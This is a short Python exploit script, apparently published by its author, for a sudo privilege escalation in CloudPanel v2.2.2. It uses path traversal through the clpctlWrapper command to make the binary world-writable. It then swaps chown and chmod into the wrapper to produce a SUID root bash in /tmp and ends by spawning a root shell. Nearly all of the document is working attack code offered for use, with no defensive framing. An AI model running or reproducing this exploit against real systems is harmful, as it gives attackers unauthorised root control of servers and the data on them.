# Exploit Author : EagleEye
# Github : https://github.com/EagleTube/
# Youtube : https://www.youtube.com/@EagleTube1337
# Title : Sudo Privilege Escalation on clpctlWrapper + path traversal
# Version Tested : CloudPanel v2.2.2
# Telegram : @NOP_0x90

import os
import subprocess

def exec_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

def exploit():
    print('[-] AUTHOR : EAGLE EYE [-]')
    print('[+] Overriding file to writable')
    exec_command('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=../../../../../../../../../../usr/bin/clpctlWrapper')
    print('[+] Backup clpctlWrapper into tmp...')
    exec_command('cp /usr/bin/clpctlWrapper /tmp/clpctlWrapper')
    print('[+] Replacing clpctlWrapper with cp...')
    exec_command('cp /bin/bash /tmp/bash')
    print('[+] Assigning suid to /tmp/bash...')
    exec_command('cp /bin/chown /usr/bin/clpctlWrapper')
    exec_command('sudo /usr/bin/clpctlWrapper root:root /tmp/bash')
    exec_command('cp /bin/chmod /usr/bin/clpctlWrapper')
    exec_command('sudo /usr/bin/clpctlWrapper 6755 /tmp/bash')
    exec_command('cp /tmp/clpctlWrapper /usr/bin/clpctlWrapper')
    print('[+] Popping root shell...')
    os.system('/tmp/bash -p -c "chown root:root /usr/bin/clpctlWrapper && chmod 0700 /usr/bin/clpctlWrapper && python3 root.py"')

if __name__ == '__main__':
    exploit()
